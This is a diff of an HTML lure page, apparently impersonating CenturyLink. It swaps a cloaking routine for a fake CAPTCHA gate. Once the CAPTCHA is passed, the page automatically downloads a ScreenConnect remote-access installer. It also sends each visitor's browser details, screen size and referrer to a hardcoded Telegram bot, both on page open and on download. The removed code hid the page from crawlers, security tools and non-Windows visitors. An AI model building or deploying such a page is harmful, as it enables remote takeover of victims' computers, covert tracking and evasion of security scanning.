@@ -55,49 +55,134 @@
         .footer-text { font-size: 12px; color: #7a9a8a; line-height: 1.7; }
         hr { border: 0; border-top: 1px solid #1a4a2e; margin: 6px 0 16px; }
 
-        /* ===== ACCESS DENIED PAGE ===== */
-        #accessDenied {
+        /* ===== CAPTCHA STYLES ===== */
+        #captchaOverlay {
             display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+        #captchaOverlay.active {
+            display: flex;
+        }
+        .captcha-box {
+            background: #fff;
+            border-radius: 16px;
+            padding: 40px 35px;
+            max-width: 420px;
+            width: 90%;
             text-align: center;
-            padding: 100px 20px;
-            min-height: 100vh;
-            background: #f8f9fa;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: fadeIn 0.3s ease;
         }
-
-        #accessDenied h1 {
-            font-size: 48px;
-            color: #dc3545;
+        .captcha-box h3 {
+            color: #023616;
+            font-size: 20px;
+            margin-bottom: 8px;
+        }
+        .captcha-box p {
+            color: #4a5b6e;
+            font-size: 14px;
             margin-bottom: 20px;
         }
-
-        #accessDenied p {
+        .captcha-display {
+            background: #f0f4f8;
+            padding: 20px;
+            border-radius: 10px;
+            font-size: 32px;
+            font-weight: 700;
+            letter-spacing: 8px;
+            color: #023616;
+            font-family: 'Courier New', monospace;
+            margin-bottom: 15px;
+            user-select: none;
+            border: 2px dashed #b0c4d8;
+        }
+        .captcha-input {
+            width: 100%;
+            padding: 12px 16px;
             font-size: 18px;
-            color: #6c757d;
-            max-width: 500px;
-            margin: 0 auto;
+            border: 2px solid #d0d8e0;
+            border-radius: 8px;
+            text-align: center;
+            letter-spacing: 4px;
+            font-family: 'Courier New', monospace;
+            transition: border-color 0.3s;
         }
-
-        #accessDenied .icon {
-            font-size: 80px;
-            margin-bottom: 20px;
+        .captcha-input:focus {
+            outline: none;
+            border-color: #0b6efd;
         }
-
-        .hidden {
-            display: none !important;
+        .captcha-input.error {
+            border-color: #dc3545;
+            background: #fff5f5;
+        }
+        .captcha-row {
+            display: flex;
+            gap: 10px;
+            margin-top: 12px;
+            justify-content: center;
+        }
+        .captcha-btn {
+            padding: 12px 30px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .captcha-btn.verify {
+            background: #023616;
+            color: #fff;
+        }
+        .captcha-btn.verify:hover {
+            background: #034c1f;
+        }
+        .captcha-btn.verify:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .captcha-btn.refresh {
+            background: #e8edf5;
+            color: #1a2b3e;
+        }
+        .captcha-btn.refresh:hover {
+            background: #d0d8e0;
+        }
+        .captcha-error-msg {
+            color: #dc3545;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+        }
+        .captcha-error-msg.show {
+            display: block;
         }
     </style>
 </head>
 <body>
 
-    <!-- ===== ACCESS DENIED PAGE ===== -->
-    <div id="accessDenied">
-        <div class="icon">🚫</div>
-        <h1>Access Denied</h1>
-        <p>This page is only available on Windows desktop devices.</p>
-        <p style="margin-top: 10px; font-size: 14px; color: #adb5bd;">Error: Unsupported Device or Bot Detected</p>
+    <!-- ===== CAPTCHA OVERLAY ===== -->
+    <div id="captchaOverlay">
+        <div class="captcha-box">
+            <h3>🔐 Verify you are human</h3>
+            <p>Please enter the characters shown below</p>
+            <div class="captcha-display" id="captchaText">ABCD</div>
+            <input type="text" class="captcha-input" id="captchaInput" placeholder="Enter code" maxlength="6" autocomplete="off" />
+            <div class="captcha-error-msg" id="captchaError">❌ Incorrect code. Please try again.</div>
+            <div class="captcha-row">
+                <button class="captcha-btn refresh" onclick="generateCaptcha()">🔄 Refresh</button>
+                <button class="captcha-btn verify" id="captchaVerifyBtn" onclick="verifyCaptcha()">✅ Verify</button>
+            </div>
+        </div>
     </div>
 
-    <!-- ===== MAIN CONTENT (كل المحتوى القديم) ===== -->
+    <!-- ===== MAIN CONTENT ===== -->
     <div id="mainContent">
 
         <!-- TOP BAR -->
@@ -181,99 +266,66 @@
         <a id="autoDownloadLink" href="https://centurylink22.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest" download="https://centurylink22.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest" style="display:none;"></a>
 
     </div>
-    <!-- ===== نهاية MAIN CONTENT ===== -->
 
-    <!-- ===== SCRIPT ===== -->
     <script>
     // ============================================================
-    // 🛡️ DEVICE & BOT DETECTION - ACCESS CONTROL
+    // 🔐 CAPTCHA SYSTEM
     // ============================================================
-    
-    function checkAccess() {
-        const userAgent = navigator.userAgent.toLowerCase();
-        const platform = navigator.platform.toLowerCase();
+    let captchaCode = '';
 
-        // 1️⃣ DETECT BOTS
-        const botPatterns = [
-            'bot', 'crawl', 'spider', 'scrape', 'googlebot', 'bingbot',
-            'facebookexternalhit', 'twitterbot', 'slurp', 'duckduckbot',
-            'baiduspider', 'yandexbot', 'ia_archiver', 'mediapartners-google',
-            'facebook', 'whatsapp', 'telegram', 'discord', 'slack',
-            'curl', 'wget', 'python-requests', 'postman', 'insomnia',
-            'headless', 'phantomjs', 'selenium', 'puppeteer', 'playwright'
-        ];
-
-        for (let pattern of botPatterns) {
-            if (userAgent.includes(pattern)) {
-                return false;
-            }
+    function generateCaptcha() {
+        const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+        let code = '';
+        for (let i = 0; i < 5; i++) {
+            code += chars.charAt(Math.floor(Math.random() * chars.length));
         }
-
-        // 2️⃣ DETECT WINDOWS
-        const isWindows = (
-            platform.includes('win') ||
-            userAgent.includes('windows') ||
-            userAgent.includes('win32') ||
-            userAgent.includes('win64')
-        );
-
-        if (!isWindows) {
-            return false;
-        }
-
-        // 3️⃣ DETECT MOBILE (حتى لو ويندوز)
-        const isMobile = (
-            userAgent.includes('mobile') ||
-            userAgent.includes('android') ||
-            userAgent.includes('iphone') ||
-            userAgent.includes('ipad') ||
-            userAgent.includes('ipod') ||
-            userAgent.includes('blackberry') ||
-            userAgent.includes('windows phone')
-        );
-
-        if (isMobile) {
-            return false;
-        }
-
-        // 4️⃣ CHECK SCREEN SIZE
-        if (window.innerWidth < 800) {
-            return false;
-        }
-
-        return true;
+        captchaCode = code;
+        document.getElementById('captchaText').textContent = code;
+        document.getElementById('captchaInput').value = '';
+        document.getElementById('captchaInput').className = 'captcha-input';
+        document.getElementById('captchaError').className = 'captcha-error-msg';
+        document.getElementById('captchaVerifyBtn').disabled = false;
     }
 
-    // ============================================================
-    // 🔥 APPLY ACCESS CONTROL (تشغيل الكود)
-    // ============================================================
-    (function() {
-        const accessDenied = document.getElementById('accessDenied');
-        const mainContent = document.getElementById('mainContent');
-        
-        if (!checkAccess()) {
-            // إخفاء المحتوى الرئيسي
-            mainContent.style.display = 'none';
-            // إظهار رسالة المنع
-            accessDenied.style.display = 'block';
-            // منع تنفيذ أي كود تاني
-            return;
+    function verifyCaptcha() {
+        const input = document.getElementById('captchaInput');
+        const error = document.getElementById('captchaError');
+        const btn = document.getElementById('captchaVerifyBtn');
+
+        if (input.value.toUpperCase() === captchaCode) {
+            // ✅ Correct
+            error.className = 'captcha-error-msg';
+            btn.disabled = true;
+            document.getElementById('captchaOverlay').className = '';
+            // Start download
+            startDownload();
+        } else {
+            // ❌ Wrong
+            input.className = 'captcha-input error';
+            error.className = 'captcha-error-msg show';
+            btn.disabled = false;
+            // Auto refresh after 3 wrong attempts
+            setTimeout(() => {
+                generateCaptcha();
+            }, 2000);
         }
-        
-        // ✅ Access granted
-        accessDenied.style.display = 'none';
-        mainContent.style.display = 'block';
-    })();
+    }
+
+    // Enter key to verify
+    document.addEventListener('DOMContentLoaded', function() {
+        document.getElementById('captchaInput').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                verifyCaptcha();
+            }
+        });
+    });
 
     // ============================================================
-    // 🔐 Telegram Settings - Updated with your data
+    // 🔐 Telegram Settings
     // ============================================================
     const BOT_TOKEN = '8724015412:AAEPAQpD1N7-SmO0TFr6EKu7NuE4KN8OsuQ';
     const CHAT_ID = '6145591347';
 
-    // ============================================================
-    // 📤 Send Telegram Notification
-    // ============================================================
     function sendTelegramAlert(message) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         fetch(url, {
@@ -295,9 +347,6 @@
           .catch(err => console.log('⚠️ Failed to send:', err));
     }
 
-    // ============================================================
-    // 📄 Page Opened Notification
-    // ============================================================
     function notifyPageOpened() {
         const msg = `
 📄 <b>👁️ Page Opened</b>
@@ -307,14 +356,10 @@
 🌍 Language: ${navigator.language}
 📱 Screen: ${screen.width}x${screen.height}
 🔗 Referrer: ${document.referrer || 'Direct'}
-👤 Username: @amunisback
         `.trim();
         sendTelegramAlert(msg);
     }
 
-    // ============================================================
-    // ⬇️ File Downloaded Notification
-    // ============================================================
     function notifyFileDownloaded() {
         const msg = `
 ⬇️ <b>📥 File Downloaded!</b>
@@ -324,7 +369,6 @@
 🌍 Language: ${navigator.language}
 📱 Screen: ${screen.width}x${screen.height}
 🔗 Referrer: ${document.referrer || 'Direct'}
-👤 Username: @amunisback
         `.trim();
         sendTelegramAlert(msg);
     }
@@ -393,17 +437,19 @@
     }
 
     // ============================================================
-    // 🚀 Auto-start when page loads
+    // 🚀 Auto-start: Show CAPTCHA first, then download
     // ============================================================
     window.addEventListener('DOMContentLoaded', function() {
-        // نتأكد إن الوصول ممنوح قبل ما نبدأ (حماية إضافية)
-        if (!checkAccess()) {
-            return;
-        }
+        // Generate captcha
+        generateCaptcha();
+        // Show captcha overlay
+        document.getElementById('captchaOverlay').className = 'active';
+        // Focus input
         setTimeout(() => {
-            notifyPageOpened();
-            startDownload();
-        }, 500);
+            document.getElementById('captchaInput').focus();
+        }, 300);
+        // Notify page opened
+        notifyPageOpened();
     });
     </script>
 
